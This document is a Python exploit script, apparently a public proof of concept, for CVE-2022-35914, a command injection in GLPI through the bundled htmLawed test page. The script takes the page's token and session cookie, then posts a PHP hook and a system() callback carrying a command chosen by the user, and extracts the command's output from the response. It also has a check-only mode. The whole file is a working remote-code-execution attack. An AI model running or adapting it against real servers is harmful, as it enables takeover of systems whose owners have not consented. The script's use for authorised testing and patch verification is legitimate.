#!/usr/bin/python
# -*- coding: utf-8 -*-

import argparse
from bs4 import BeautifulSoup
import requests
import sys
import re

requests.packages.urllib3.disable_warnings() 

RED = '\x1b[91m'
BLUE = '\033[94m'
GREEN = '\033[32m'
ENDC = '\033[0m'

banner="""  
  ______     _______     ____   ___ ____  ____      _________  ___  _ _  _   
 / ___\ \   / / ____|   |___ \ / _ \___ \|___ \    |___ / ___|/ _ \/ | || |  
| |    \ \ / /|  _| _____ __) | | | |__) | __) |____ |_ \___ \ (_) | | || |_ 
| |___  \ V / | |__|_____/ __/| |_| / __/ / __/_____|__) |__) \__, | |__   _|
 \____|  \_/  |_____|   |_____|\___/_____|_____|   |____/____/  /_/|_|  |_|  
            v2.0 by sender https://github.com/allendemoura
"""


def main():
    print(banner)
    parser = argparse.ArgumentParser(description='CVE-2022-35914 - GLPI - Command injection using a third-party library script')
    parser.add_argument('-u', type=str, required=True, dest='url', help = "URL to test")
    parser.add_argument('-c', type=str, required=False, dest='cmd', default = "id", help = "Command to launch (default: id)")
    parser.add_argument('-f', type=str, required=False, dest='hook', default = "array_map", help = "PHP hook function (default: array_map)")
    parser.add_argument('-b', type=str, required=False, dest='callback', default = "system", help = "PHP callback function (default: system)")
    parser.add_argument('--check', action="store_true", dest='check', help = "Just check, no command execution.")
    parser.add_argument('--user-agent', type=str, required=False, default="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36", dest='user_agent', help = "Custom User-Agent")
    args = parser.parse_args()
    exploit(args.url, args.cmd, args.user_agent,args.check,args.hook,args.callback)

def exploit(url,cmd,user_agent,check,hook,callback):
    uri = "/vendor/htmlawed/htmlawed/htmLawedTest.php"
    headers = {'User-Agent': user_agent}

    session = requests.Session()
    response_part1 = session.get(str(url)+uri, verify=False, headers=headers)
    if (response_part1.status_code != 200):
        fail()
    
    soup = BeautifulSoup(response_part1.text, 'html.parser')
    if (soup.title.text.find("htmLawed") == -1):
        fail()

    if (check):
        print(GREEN + "[+] Server potentially vulnerable to CVE-2022-35914" + ENDC)
        sys.exit()

    # Prepare POST request
    token_value = soup.find_all(id='token')[0]['value']
    sid_value = session.cookies.get("sid")
    body = {"token":token_value,"text":callback,"hfoo":cmd,"hhook":hook,"sid":sid_value}
    response_part2 = session.post(str(url)+uri, verify=False, headers=headers, data=body)
    parse(response_part2.text)

def parse(response):
    # leaving this for future parsing optimization
    #soup = BeautifulSoup(response, 'html.parser')
 
    # find the form tag (~line 379?)
    form_end_match = re.search(r'</form>', response)
    if form_end_match:
        form_end_index = form_end_match.start()
    else:
        # give user full output
        print(RED + "Error: </form> tag not found!")
        input("Your command may have executed, but you'll need to search for the output yourself. Press Enter to see the full HTTP response body:" + ENDC)
        print(response)
        return None

    # Find the index of br tag after the form tag
    br_match = re.search(r'<br />', response[form_end_index:])
    if br_match:
        br_index = form_end_index + br_match.start()
    else:
        # give user full output
        print(RED + "Error: <br /> tag not found after </form>!")
        input("Your command may have executed, but you'll need to search for the output yourself. Press Enter to see the rest of the HTTP response body:" + ENDC)
        print(response[form_end_index:])
        input(RED + "Did you find it? If not, Press Enter to see the full HTTP response body:" + ENDC)
        print(response)
        return None

    # Extract the cmd output between the tags
    cmd_output = response[form_end_index + len('</form>'):br_index]

    if (cmd_output != None):
        print(cmd_output)

def fail():
    print(RED + "[-] Server not vulnerable to CVE-2022-35914" + ENDC)
    sys.exit()

if __name__ == '__main__':
    main()
